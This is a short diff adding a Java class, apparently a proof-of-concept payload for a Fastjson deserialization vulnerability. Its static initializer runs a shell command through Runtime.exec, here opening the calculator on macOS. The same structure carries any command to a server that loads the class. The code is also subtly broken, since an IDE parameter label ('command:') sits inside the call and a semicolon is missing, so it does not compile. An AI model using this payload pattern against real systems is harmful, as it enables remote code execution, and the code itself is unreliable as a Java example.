@@ -1,0 +1,14 @@
+public class Fastjsonpoc{
+
+public Fastjsonpoc(){
+}
+static{
+try{
+Runtime.getRuntime().exec(command:"open -a calculator.app")
+}catch(Exception var1){
+var1.printStackTrace();
+}
+
+}
+
+}
